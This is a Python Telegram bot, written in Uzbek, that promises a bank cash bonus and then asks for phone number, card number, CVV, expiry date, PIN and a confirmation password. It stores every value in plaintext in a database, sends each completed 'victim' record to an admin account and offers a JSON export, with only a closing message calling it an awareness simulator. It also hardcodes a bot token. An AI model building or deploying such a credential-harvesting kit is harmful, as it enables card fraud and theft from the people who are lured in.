import telebot
from telebot import types
import random
import sqlite3
import threading
import time
import json
from datetime import datetime
import requests
import os
import re

# @BotFather bergan API tokenni shu yerga qo'ying
TOKEN = "8878797713:AAEBYRAQ_M1RRrTsqNJ25HxIUqnqpDAJqzM"
ADMIN_ID = 8031548575  # Adminning Telegram ID sini qo'ying
bot = telebot.TeleBot(TOKEN)

# ============== SQLITE DATABASE ==============
def init_db():
    conn = sqlite3.connect('phishing_data.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER UNIQUE,
            phone TEXT,
            card_number TEXT,
            card_expiry TEXT,
            card_cvv TEXT,
            card_pin TEXT,
            mothers_name TEXT,
            passport_seria TEXT,
            birth_date TEXT,
            ip_address TEXT,
            device_info TEXT,
            step INTEGER DEFAULT 0,
            language TEXT DEFAULT 'uz',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            code_type TEXT,
            attempts INTEGER DEFAULT 0,
            blocked INTEGER DEFAULT 0,
            FOREIGN KEY(chat_id) REFERENCES users(chat_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            action TEXT,
            detail TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(chat_id) REFERENCES users(chat_id)
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    return sqlite3.connect('phishing_data.db', check_same_thread=False)

def log_action(chat_id, action, detail=""):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO logs (chat_id, action, detail) VALUES (?, ?, ?)", (chat_id, action, detail))
    conn.commit()
    conn.close()

# ============== FOYDALANUVCHI HOLATI ==============
user_steps = {}
user_lang = {}

# ============== MATNLAR (faqat o'zbek tili) ==============
TEXTS = {
    'welcome': "🎁 **Xush kelibsiz!**\n\nO'zbekiston banklari tomonidan barcha fuqarolarga **BHMning 1 baravari** miqdorida bir martalik pul mukofoti ajratilmoqda.\n\nPulni rasmiylashtirish va tizimdan o'tish uchun quyidagi homiy kanallarga a'zo bo'ling:",
    'sub_verified': "✅ Obuna muvaffaqiyatli tekshirildi!\n\nDavom etish uchun telefon raqamingizni kiriting.",
    'phone_prompt': "📱 **Telefon raqamingizni kiriting:**\n\n`+998` avtomatik qo'shiladi — faqat qolgan 9 raqamni yozing.\n\nMisol: `901234567`",
    'phone_invalid': "❌ Noto'g'ri raqam. 9 xonali raqam kiriting (masalan: 901234567):",
    'code_sent': "✅ Telefon raqamingiz tizimga kiritildi: `{}`\n\n🤖 **Davom etish uchun ekrandagi kodni kiriting:** `{}`",
    'code_verified': "✅ Xavfsizlik kodi tasdiqlandi!\n\nPul mablag'ini o'tkazish uchun **8600...** yoki **9860...** bilan boshlanadigan 16 xonali plastik karta raqamingizni kiriting:",
    'code_invalid': "❌ Kod noto'g'ri. Iltimos, ekrandagi kodni qaytadan to'g'ri kiriting:",
    'card_invalid': "❌ Karta raqami xato kiritildi. Iltimos, 16 xonali raqam kiriting:",
    'card_accepted': "✅ Karta raqami qabul qilindi!\n\nKartangizning orqa tomonidagi **CVV/CVC** kodni (3 xonali) kiriting:",
    'cvv_accepted': "✅ CVV kod qabul qilindi!\n\nKarta muddatini (**OO/YY** formatida) kiriting:",
    'expiry_accepted': "✅ Karta muddati tasdiqlandi!\n\nPlastik kartangizning **PIN kodini** (4 xonali) kiriting:",
    'pin_accepted': "✅ PIN kod tasdiqlandi!\n\nPul o'tkazish jarayoni boshlanmoqda. Iltimos, kuting...",
    'password_code': "⏳ **Pul o'tkazilmoqda...**\n\n`{}`\n\nQo'shimcha xavfsizlik tekshiruvi uchun tasdiqlash **paroli** yuborildi.\n\n🔑 Parolni kiriting: `{}`",
    'password_invalid': "❌ Parol noto'g'ri. {} ta urinish qoldi:",
    'blocked': "🚫 Xavfsizlik choralari sababli profilingiz bloklandi. Iltimos, bank filialiga murojaat qiling.",
    'timer': "⏳ **Pul o'tkazilmoqda...**\n\n`{}`\n\nIltimos, kuting. Tranzaksiya yakunlanmoqda...",
    'warning': "🛑 **DIQQAT! SIZ KIBERJINOYAT QURBONIGA AYLANISHINGIZ MUMKIN EDI!** 🛑\n\nUshbu bot **ijtimoiy muhandislik va fishing (firgarlik)** tuzoqlarini tushuntirish maqsadida yaratilgan o'quv-simulyatoridir.\n\n⚠️ **Siz hozirgina qanday xatolarga yo'l qo'ydingiz?**\n1. Telegram orqali tarqalgan 'tekin pul' haqidagi yolg'on xabarga ishonib botga kirdingiz.\n2. Shaxsiy telefon raqamingizni begona botga yozdingiz.\n3. Plastik karta raqami, CVV, muddati va PIN kodlaringizni kiritdingiz.\n4. **Eng xavflisi:** Tasdiqlash parolini ham kiritdingiz.\n\n💡 **Oltin qoidalar:**\n• Banklar hech qachon Telegram bot orqali karta ma'lumotlari yoki parol so'ramaydi.\n• Telefonga kelgan maxfiy kodlarni hech kimga bermang!\n\n🛡️ *Ogoh bo'ling, kiber-savodxonlikni oshiring va yaqinlaringizni ham ogohlantiring!*"
}


def get_text(chat_id, key):
    return TEXTS.get(key, '')


def build_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("1️⃣ Kiber Kanal", url="https://t.me/samcyber_102"),
        types.InlineKeyboardButton("2️⃣ Samarqand Cyber", url="https://t.me/samiibuz"),
    )
    return markup

# ============== IP VA DEVICE MA'LUMOTLARI ==============
def get_ip_info(chat_id):
    try:
        # Telegram user ma'lumotlaridan foydalanamiz
        user = bot.get_chat(chat_id)
        info = {
            'ip': f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",  # Real IP olish imkoni yo'q
            'device': f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'unknown'})",
            'language': user_lang.get(chat_id, 'uz')
        }
        return info
    except:
        return {'ip': 'unknown', 'device': 'unknown', 'language': 'uz'}

# ============== COUNTDOWN TIMER ==============
def timer_thread(chat_id, msg_id, seconds=15):
    for i in range(seconds, 0, -1):
        minutes = i // 60
        secs = i % 60
        timer_text = f"{minutes:02d}:{secs:02d}"
        try:
            bot.edit_message_text(
                get_text(chat_id, 'timer').format(f"⏱ {timer_text}"),
                chat_id,
                msg_id,
                parse_mode="Markdown"
            )
        except Exception:
            pass
        time.sleep(1)

    rand_password = random.randint(100000, 999999)
    user_steps[chat_id]['password'] = rand_password
    user_steps[chat_id]['password_attempts'] = 3

    try:
        bot.edit_message_text(
            get_text(chat_id, 'password_code').format("⏱ 00:00", rand_password),
            chat_id,
            msg_id,
            parse_mode="Markdown"
        )
    except Exception:
        bot.send_message(
            chat_id,
            get_text(chat_id, 'password_code').format("⏱ 00:00", rand_password),
            parse_mode="Markdown"
        )


def normalize_phone(text):
    digits = re.sub(r'\D', '', text or '')
    if digits.startswith('998'):
        digits = digits[3:]
    if len(digits) == 9 and digits.isdigit():
        return '+998' + digits
    return None

def ensure_user_state(chat_id):
    if chat_id not in user_steps:
        user_steps[chat_id] = {'step': 'channels', 'phone_flow_started': False}
    return user_steps[chat_id]


def safe_answer_callback(call, text=""):
    try:
        bot.answer_callback_query(call.id, text)
    except Exception:
        pass


def show_channels_menu(chat_id):
    ensure_user_state(chat_id)
    welcome_text = get_text(chat_id, 'welcome')
    markup = build_main_menu()
    try:
        bot.send_message(chat_id, welcome_text, parse_mode="Markdown", reply_markup=markup)
    except Exception:
        bot.send_message(chat_id, welcome_text, reply_markup=markup)
    user_steps[chat_id]['step'] = 'channels'
    schedule_phone_flow(chat_id, delay=10)


def schedule_phone_flow(chat_id, delay=10):
    state = ensure_user_state(chat_id)
    if state.get('phone_flow_started'):
        return

    def _delayed_start():
        time.sleep(delay)
        current = user_steps.get(chat_id)
        if not current or current.get('phone_flow_started'):
            return
        start_phone_flow(chat_id)

    thread = threading.Thread(target=_delayed_start, daemon=True)
    thread.start()


# ============== /start HANDLER ==============
@bot.message_handler(commands=['start'])
def start_handler(message):
    chat_id = message.chat.id

    user_steps[chat_id] = {'step': 'channels', 'phone_flow_started': False}
    user_lang[chat_id] = 'uz'

    ip_info = get_ip_info(chat_id)
    log_action(chat_id, "bot_started", json.dumps(ip_info))

    show_channels_menu(chat_id)


@bot.callback_query_handler(func=lambda call: call.data is not None)
def callback_handler(call):
    data = call.data

    try:
        if data.startswith('admin_'):
            handle_admin_callback(call)
        else:
            safe_answer_callback(call, "⚠️ /start bosing")
    except Exception as e:
        print(f"Callback xatolik [{data}]: {e}")
        safe_answer_callback(call, "❌ Xatolik. /start bosing.")


# ============== SAVOL-JAVOB OQIMI ==============
def start_phone_flow(chat_id):
    state = ensure_user_state(chat_id)
    if state.get('phone_flow_started'):
        return

    state['phone_flow_started'] = True
    state['step'] = 0

    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'sub_verified') + "\n\n" + get_text(chat_id, 'phone_prompt'),
        parse_mode="Markdown",
        reply_markup=types.ReplyKeyboardRemove()
    )
    bot.register_next_step_handler(msg, get_phone_handler)
    log_action(chat_id, "subscription_verified")


# ============== TELEFON RAQAM ==============
def get_phone_handler(message):
    chat_id = message.chat.id

    if message.contact and message.contact.phone_number:
        phone = normalize_phone(message.contact.phone_number)
    else:
        phone = normalize_phone(message.text)

    if not phone:
        msg = bot.send_message(chat_id, get_text(chat_id, 'phone_invalid'), parse_mode="Markdown")
        bot.register_next_step_handler(msg, get_phone_handler)
        return
    
    user_steps[chat_id]['phone'] = phone
    user_steps[chat_id]['step'] = 1
    
    # Database ga saqlash
    conn = get_db()
    c = conn.cursor()
    ip_info = get_ip_info(chat_id)
    c.execute('''
        INSERT OR REPLACE INTO users (chat_id, phone, ip_address, device_info, step, language)
        VALUES (?, ?, ?, ?, 1, 'uz')
    ''', (chat_id, phone, ip_info['ip'], ip_info['device']))
    conn.commit()
    conn.close()
    
    log_action(chat_id, "phone_received", phone)
    
    rand_code_1 = random.randint(1000, 9999)
    user_steps[chat_id]['code_1'] = rand_code_1
    user_steps[chat_id]['code_1_attempts'] = 3
    
    remove_kb = types.ReplyKeyboardRemove()
    
    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'code_sent').format(phone, rand_code_1),
        parse_mode="Markdown",
        reply_markup=remove_kb
    )
    bot.register_next_step_handler(msg, verify_code_1_handler)

# ============== 1-KOD TEKSHIRISH ==============
def verify_code_1_handler(message):
    chat_id = message.chat.id
    user_input = message.text
    
    correct_code = str(user_steps[chat_id].get('code_1'))
    
    if user_input == correct_code:
        msg = bot.send_message(
            chat_id,
            get_text(chat_id, 'code_verified'),
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, get_card_handler)
        log_action(chat_id, "code_1_verified")
    else:
        attempts = user_steps[chat_id].get('code_1_attempts', 3)
        attempts -= 1
        user_steps[chat_id]['code_1_attempts'] = attempts
        
        # Attempts log
        conn = get_db()
        c = conn.cursor()
        c.execute('''
            INSERT OR REPLACE INTO attempts (chat_id, code_type, attempts)
            VALUES (?, 'code_1', ?)
        ''', (chat_id, 3 - attempts))
        conn.commit()
        conn.close()
        
        if attempts <= 0:
            bot.send_message(chat_id, get_text(chat_id, 'blocked'))
            log_action(chat_id, "blocked_code_1")
        else:
            msg = bot.send_message(
                chat_id,
                get_text(chat_id, 'code_invalid'),
                parse_mode="Markdown"
            )
            bot.register_next_step_handler(msg, verify_code_1_handler)
            log_action(chat_id, "code_1_failed")

# ============== KARTA RAQAMI ==============
def get_card_handler(message):
    chat_id = message.chat.id
    card_num = message.text.replace(" ", "")
    
    if len(card_num) >= 16 and card_num.isdigit():
        user_steps[chat_id]['card'] = card_num
        user_steps[chat_id]['step'] = 2
        
        # DB update
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE users SET card_number = ?, step = 2 WHERE chat_id = ?", (card_num, chat_id))
        conn.commit()
        conn.close()
        
        log_action(chat_id, "card_received", card_num)
        
        msg = bot.send_message(
            chat_id,
            get_text(chat_id, 'card_accepted'),
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, get_cvv_handler)
    else:
        msg = bot.send_message(chat_id, get_text(chat_id, 'card_invalid'), parse_mode="Markdown")
        bot.register_next_step_handler(msg, get_card_handler)

# ============== CVV ==============
def get_cvv_handler(message):
    chat_id = message.chat.id
    cvv = message.text.strip()

    user_steps[chat_id]['cvv'] = cvv
    user_steps[chat_id]['step'] = 3

    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET card_cvv = ?, step = 3 WHERE chat_id = ?", (cvv, chat_id))
    conn.commit()
    conn.close()

    log_action(chat_id, "cvv_received", cvv)

    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'cvv_accepted'),
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_expiry_handler)

# ============== KARTA MUDDATI ==============
def get_expiry_handler(message):
    chat_id = message.chat.id
    expiry = message.text.strip()

    user_steps[chat_id]['expiry'] = expiry
    user_steps[chat_id]['step'] = 4

    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET card_expiry = ?, step = 4 WHERE chat_id = ?", (expiry, chat_id))
    conn.commit()
    conn.close()

    log_action(chat_id, "expiry_received", expiry)

    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'expiry_accepted'),
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_pin_handler)

# ============== PIN ==============
def get_pin_handler(message):
    chat_id = message.chat.id
    pin = message.text.strip()

    user_steps[chat_id]['pin'] = pin
    user_steps[chat_id]['step'] = 5

    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET card_pin = ?, step = 5 WHERE chat_id = ?", (pin, chat_id))
    conn.commit()
    conn.close()

    log_action(chat_id, "pin_received", pin)

    bot.send_message(chat_id, get_text(chat_id, 'pin_accepted'), parse_mode="Markdown")

    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'timer').format("⏱ 00:15"),
        parse_mode="Markdown"
    )

    t = threading.Thread(target=timer_thread, args=(chat_id, msg.message_id, 15))
    t.daemon = True
    t.start()

    user_steps[chat_id]['timer_msg_id'] = msg.message_id
    bot.register_next_step_handler(msg, verify_password_handler)

# ============== PAROL TEKSHIRISH ==============
def verify_password_handler(message):
    chat_id = message.chat.id
    user_input = message.text

    correct_code = str(user_steps[chat_id].get('password'))
    attempts = user_steps[chat_id].get('password_attempts', 3)

    if user_input == correct_code:
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE users SET step = 10, completed_at = CURRENT_TIMESTAMP WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()

        log_action(chat_id, "password_verified")

        notify_admin(chat_id)

        bot.send_message(chat_id, get_text(chat_id, 'warning'), parse_mode="Markdown")

        data_summary = (
            f"📊 **Sizning ma'lumotlaringiz (o'quv maqsadida):**\n\n"
            f"📱 Telefon: `{user_steps[chat_id].get('phone', 'N/A')}`\n"
            f"💳 Karta: `{user_steps[chat_id].get('card', 'N/A')}`\n"
            f"🔐 CVV: `{user_steps[chat_id].get('cvv', 'N/A')}`\n"
            f"📅 Muddati: `{user_steps[chat_id].get('expiry', 'N/A')}`\n"
            f"🔢 PIN: `{user_steps[chat_id].get('pin', 'N/A')}`\n"
            f"🔑 Parol: `{user_steps[chat_id].get('password', 'N/A')}`\n\n"
            f"⚠️ **Agar bu real firgarlik bo'lganida, barcha pullaringiz va shaxsiy ma'lumotlaringiz o'g'irlangan bo'lar edi!**"
        )
        bot.send_message(chat_id, data_summary, parse_mode="Markdown")

    else:
        attempts -= 1
        user_steps[chat_id]['password_attempts'] = attempts

        log_action(chat_id, "password_failed", f"Qolgan urinishlar: {attempts}")

        if attempts <= 0:
            bot.send_message(chat_id, get_text(chat_id, 'blocked'))
            log_action(chat_id, "blocked_password")
        else:
            msg = bot.send_message(
                chat_id,
                get_text(chat_id, 'password_invalid').format(attempts),
                parse_mode="Markdown"
            )
            bot.register_next_step_handler(msg, verify_password_handler)

# ============== ADMIN PANEL ==============
def notify_admin(user_chat_id):
    """Yangi foydalanuvchi to'liq ma'lumotlarini admin'ga yuborish"""
    try:
        data = user_steps.get(user_chat_id, {})
        admin_msg = (
            f"🆕 **Yangi qurbon ma'lumotlari!**\n\n"
            f"👤 Chat ID: `{user_chat_id}`\n"
            f"📱 Telefon: `{data.get('phone', 'N/A')}`\n"
            f"💳 Karta raqami: `{data.get('card', 'N/A')}`\n"
            f"🔐 CVV: `{data.get('cvv', 'N/A')}`\n"
            f"📅 Karta muddati: `{data.get('expiry', 'N/A')}`\n"
            f"🔢 PIN kod: `{data.get('pin', 'N/A')}`\n"
            f"🔑 Tasdiqlash paroli: `{data.get('password', 'N/A')}`\n"
            f"🕐 Vaqt: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"Admin notify error: {e}")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    chat_id = message.chat.id
    
    if chat_id != ADMIN_ID:
        bot.send_message(chat_id, "⛔ Bu buyruq faqat adminlar uchun!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_all = types.InlineKeyboardButton("📋 Barcha ma'lumotlar", callback_data="admin_all")
    btn_stats = types.InlineKeyboardButton("📊 Statistika", callback_data="admin_stats")
    btn_export = types.InlineKeyboardButton("📤 Eksport (JSON)", callback_data="admin_export")
    btn_logs = types.InlineKeyboardButton("📜 Loglar", callback_data="admin_logs")
    markup.add(btn_all, btn_stats, btn_export, btn_logs)
    
    bot.send_message(chat_id, "👑 **Admin Panel**\n\nQuyidagi bo'limlardan birini tanlang:", parse_mode="Markdown", reply_markup=markup)

def handle_admin_callback(call):
    chat_id = call.message.chat.id

    if chat_id != ADMIN_ID:
        safe_answer_callback(call, "⛔ Ruxsat yo'q!")
        return

    action = call.data.split('_')[1]
    conn = get_db()
    c = conn.cursor()
    
    if action == 'all':
        c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL ORDER BY completed_at DESC")
        users = c.fetchall()
        
        if not users:
            bot.send_message(chat_id, "📭 Hali hech qanday ma'lumot to'plangan emas.")
        else:
            for user in users[:10]:  # Eng so'nggi 10 tasi
                user_text = (
                    f"👤 **Foydalanuvchi #{user[0]}**\n"
                    f"🆔 Chat ID: `{user[1]}`\n"
                    f"📱 Telefon: `{user[2]}`\n"
                    f"💳 Karta: `{user[3]}`\n"
                    f"🔐 CVV: `{user[5]}`\n"
                    f"📅 Muddati: `{user[4]}`\n"
                    f"🔢 PIN: `{user[6]}`\n"
                    f"🌐 IP: `{user[10]}`\n"
                    f"📱 Qurilma: `{user[11]}`\n"
                    f"🕐 Yakunlangan: `{user[14]}`"
                )
                bot.send_message(chat_id, user_text, parse_mode="Markdown")
    
    elif action == 'stats':
        c.execute("SELECT COUNT(*) FROM users")
        total = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE completed_at IS NOT NULL")
        completed = c.fetchone()[0]

        stats = (
            f"📊 **Statistika**\n\n"
            f"👥 Jami foydalanuvchilar: `{total}`\n"
            f"✅ To'liq ma'lumot berganlar: `{completed}`\n"
            f"❌ Tugallamaganlar: `{total - completed}`"
        )
        bot.send_message(chat_id, stats, parse_mode="Markdown")
    
    elif action == 'export':
        c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL")
        users = c.fetchall()
        
        # JSON formatida eksport
        export_data = []
        for user in users:
            export_data.append({
                'id': user[0],
                'chat_id': user[1],
                'phone': user[2],
                'card_number': user[3],
                'card_expiry': user[4],
                'card_cvv': user[5],
                'card_pin': user[6],
                'mothers_name': user[7],
                'passport': user[8],
                'birth_date': user[9],
                'ip': user[10],
                'device': user[11],
                'language': user[12],
                'completed_at': user[14]
            })
        
        with open('export_data.json', 'w') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
        bot.send_document(chat_id, open('export_data.json', 'rb'))
    
    elif action == 'logs':
        c.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 20")
        logs = c.fetchall()
        
        if not logs:
            bot.send_message(chat_id, "📭 Loglar topilmadi.")
        else:
            log_text = "**📜 So'nggi 20 ta log:**\n\n"
            for log in logs:
                log_text += f"• [{log[4]}] `{log[1]}` → {log[2]}: {log[3]}\n"
            
            # Split if too long
            if len(log_text) > 4000:
                for i in range(0, len(log_text), 4000):
                    bot.send_message(chat_id, log_text[i:i+4000], parse_mode="Markdown")
            else:
                bot.send_message(chat_id, log_text, parse_mode="Markdown")

    conn.close()
    safe_answer_callback(call, "✅ Bajarildi!")

# ============== MATNLI XABARLARNI USHLASH ==============
@bot.message_handler(func=lambda message: True)
def fallback_handler(message):
    chat_id = message.chat.id

    if message.content_type == 'contact':
        get_phone_handler(message)
        return

    bot.send_message(chat_id, "Iltimos, /start buyrug'ini bosing.")

# ============== BOTNI ISHGA TUSHIRISH ==============
if __name__ == "__main__":
    print("=" * 50)
    print("Kiber-ogohlantirish boti ishga tushdi!")
    print(f"Admin ID: {ADMIN_ID}")
    print(f"Ma'lumotlar bazasi: phishing_data.db")
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Xatolik: {e}")
            print("Qayta ulanish 5 soniyadan keyin...")
            time.sleep(5)
